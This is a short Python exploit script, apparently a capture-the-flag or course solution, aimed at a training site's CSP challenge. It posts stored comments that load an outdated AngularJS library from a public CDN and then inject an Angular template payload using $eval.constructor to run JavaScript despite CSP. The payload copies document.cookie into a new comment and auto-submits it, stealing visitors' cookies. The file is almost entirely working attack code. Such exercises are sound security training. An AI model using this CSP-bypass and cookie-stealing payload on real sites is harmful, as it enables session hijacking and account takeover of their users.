import requests
import random
import string

url = "https://csp.training.jinblack.it"

def gen_ran_str(size=15):
	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

s = requests.Session()

# just a request to arrive to the second page
r = s.post(url, data={
	'title': gen_ran_str(),
	'location': gen_ran_str(),
	'description': gen_ran_str(),
	'proposals': gen_ran_str()})
new_url = r.url

# inserting a comment
r = s.post(new_url, data={
	"name": gen_ran_str(),
	# comment field is not escaped, we first download a not safe version of angular
	"comment": "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js'></script>"})


r = s.post(new_url, data={
	"name": gen_ran_str(),
	# we create another comment inserting a div angular element, that will g3et parsed by the angular file we downloaded before
	# This verison of angular permits us to inserting javascript inside elements with eval
	# the javascript creates a comment putting the cookies and submitting it
	"comment": '''<div ng-app ng-csp>{{$eval.constructor(\'
		document.querySelector("#name").value = "wow!";
		document.querySelector("#comment").value = document.cookie;
		document.querySelector("body > div > small > form > button:nth-child(2)").click();
		\')()}}</div>'''})

print(r.url)
